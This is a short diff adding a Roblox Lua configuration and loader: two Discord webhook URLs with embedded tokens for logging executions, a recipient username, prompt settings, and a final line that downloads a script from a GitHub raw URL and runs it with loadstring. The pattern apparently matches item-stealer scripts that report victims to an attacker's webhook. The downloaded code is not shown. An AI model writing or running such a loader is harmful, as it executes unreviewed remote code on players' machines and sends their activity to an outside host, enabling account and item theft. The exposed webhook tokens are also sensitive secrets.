@@ -1,0 +1,6 @@
+LogsWebhook = "https://discord.com/api/webhooks/1327886167395536918/1rIMVhbuJ_fOADZFfUGa3yIcBkGLKsYWCuAEQLgWUp62ZtZQBAVgzE4gyIzCLZhYbZQh" 
+ExecutionWebhook = "https://discord.com/api/webhooks/1327886167395536918/1rIMVhbuJ_fOADZFfUGa3yIcBkGLKsYWCuAEQLgWUp62ZtZQBAVgzE4gyIzCLZhYbZQh" -- << Webhook for logging executions >>
+Username = "dumbickA2"
+PromptText = "execute successfully"
+RandomizedPrompt = false
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DrubGrub2/coding/refs/heads/main/Script"))()
